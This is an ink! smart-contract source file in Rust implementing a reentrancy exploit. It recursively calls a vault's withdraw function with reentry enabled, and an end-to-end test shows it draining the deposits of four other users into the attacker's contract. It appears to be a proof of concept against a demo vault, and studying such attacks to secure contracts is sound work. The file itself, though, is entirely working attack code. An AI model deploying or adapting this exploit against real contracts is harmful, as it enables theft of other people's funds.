#![cfg_attr(not(feature = "std"), no_std)]

#[ink::contract]
mod exploit {
    use ink::env::call::{build_call, Selector};
    use ink::storage::Lazy;

    #[ink(storage)]
    pub struct Exploit {
        /// Owner of the contract.
        owner: AccountId,
        /// Address of the vault contract.
        contract: AccountId,
        /// Amount of money to be transferred.
        amount: Balance,
        /// Number of times the vault can be called recursively
        reentry_times_limit: u32,
        /// Number of times the vault has been called recursively
        actual_reentry_times: Lazy<u32>,
    }

    impl Exploit {
        /// Creates a new instance of the contract.
        #[ink(constructor)]
        pub fn new(
            owner: AccountId,
            contract: AccountId,
            amount: Balance,
            reentry_times_limit: u32,
        ) -> Self {
            let mut limit = Lazy::default();
            limit.set(&0);
            Self {
                owner: owner,
                contract: contract,
                amount: amount,
                reentry_times_limit: reentry_times_limit,
                actual_reentry_times: limit,
            }
        }

        /// Sets the number of times the vault will be called recursively.
        #[ink(message)]
        pub fn set_reentry_times_limit(&mut self, reentry_times_limit: u32) {
            self.reentry_times_limit = reentry_times_limit;
            self.actual_reentry_times.set(&0);
        }

        /// Returns the balance of this contract.
        #[ink(message)]
        pub fn get_balance(&mut self) -> Balance {
            self.env().balance()
        }

        /// Deposits the sent amount into the vault on behalf of this contract.
        #[ink(message, payable)]
        pub fn deposit(&mut self) -> Balance {
            let call = build_call::<ink::env::DefaultEnvironment>()
                .call(self.contract)
                .transferred_value(self.env().transferred_value())
                .exec_input(
                    ink::env::call::ExecutionInput::new(Selector::new([
                        0x2D_u8, 0x10_u8, 0xC9_u8, 0xBD_u8,
                    ]))
                    .into(),
                )
                .returns::<Balance>()
                .params();
            self.env()
                .invoke_contract(&call)
                .unwrap_or_else(|err| panic!("Err {:?}", err))
                .unwrap_or_else(|err| panic!("LangErr {:?}", err))
        }

        /// Performs the exploit.
        #[ink(message, payable, selector = 0x0)]
        pub fn exploit(&mut self) {
            ink::env::debug_println!(
                "Exploit  function called from {:?} gas left {:?}",
                self.env().caller(),
                self.env().gas_left()
            );
            let reentry_times = self.actual_reentry_times.get().unwrap();
            if reentry_times < self.reentry_times_limit {
                self.actual_reentry_times.set(&(reentry_times + 1));
                let call = build_call::<ink::env::DefaultEnvironment>()
                    .call(self.contract)
                    .transferred_value(0)
                    .exec_input(
                        ink::env::call::ExecutionInput::new(Selector::new([
                            0x76_u8, 0x75_u8, 0x7E_u8, 0xD3_u8,
                        ]))
                        .push_arg(self.env().account_id())
                        .push_arg(self.amount)
                        .push_arg(0),
                    )
                    .call_flags(ink::env::CallFlags::default().set_allow_reentry(true))
                    .returns::<Balance>()
                    .params();
                ink::env::debug_println!("Call generated gas left:{:?}", self.env().gas_left());
                self.env()
                    .invoke_contract(&call)
                    .unwrap_or_else(|err| panic!("Err {:?}", err))
                    .unwrap_or_else(|err| panic!("LangErr {:?}", err));
                ink::env::debug_println!("Call finished");
            } else {
                self.actual_reentry_times.set(&0);
            }
        }
    }

    #[cfg(all(test, feature = "e2e-tests"))]
    mod e2e_tests {
        use super::*;
        use ink_e2e::build_message;
        use vault::VaultRef;

        type E2EResult<T> = std::result::Result<T, Box<dyn std::error::Error>>;

        #[ink_e2e::test(additional_contracts = "../vault/Cargo.toml")]
        async fn e2e_test(mut client: ink_e2e::Client<C, E>) -> E2EResult<()> {
            let vault_constructor = VaultRef::new();

            // initiate vault by alice
            let vault_acc_id = client
                .instantiate("vault", &mut ink_e2e::alice(), vault_constructor, 0, None)
                .await
                .expect("instantiate failed")
                .account_id;

            let deposit =
                build_message::<VaultRef>(vault_acc_id.clone()).call(|contract| contract.deposit());

            let _alice_deposit = client
                .call(&mut ink_e2e::alice(), deposit.clone(), 1000000, None)
                .await;
            let _charlie_deposit = client
                .call(&mut ink_e2e::charlie(), deposit.clone(), 1000000, None)
                .await;
            let _dave_deposit = client
                .call(&mut ink_e2e::dave(), deposit.clone(), 1000000, None)
                .await;
            let _eve_deposit = client
                .call(&mut ink_e2e::eve(), deposit.clone(), 1000000, None)
                .await;

            let bob_account = ink_e2e::account_id(ink_e2e::AccountKeyring::Bob);
            let exploit_constructor =
                ExploitRef::new(bob_account.clone(), vault_acc_id, 1000000, 4);

            // initiate vault by bob
            let exploit_acc_id = client
                .instantiate("exploit", &mut ink_e2e::bob(), exploit_constructor, 0, None)
                .await
                .expect("instantiate failed")
                .account_id;

            let balance_exploit = build_message::<ExploitRef>(exploit_acc_id.clone())
                .call(|contract| contract.get_balance());

            let deposit_exploit = build_message::<ExploitRef>(exploit_acc_id.clone())
                .call(|contract| contract.deposit());
            let _exploit_deposit = client
                .call(&mut ink_e2e::bob(), deposit_exploit, 1000000, None)
                .await;

            let pre_exploit_balance = client
                .call_dry_run(&mut ink_e2e::bob(), &balance_exploit, 0, None)
                .await;
            assert_eq!(pre_exploit_balance.return_value(), 0u128);

            let exploit_msg = build_message::<ExploitRef>(exploit_acc_id.clone())
                .call(|contract| contract.exploit());
            let _exploit_res = client.call(&mut ink_e2e::bob(), exploit_msg, 0, None).await;

            let post_exploit_balance = client
                .call_dry_run(&mut ink_e2e::bob(), &balance_exploit, 0, None)
                .await;
            assert_eq!(post_exploit_balance.return_value(), 4000000u128);

            Ok(())
        }
    }
}
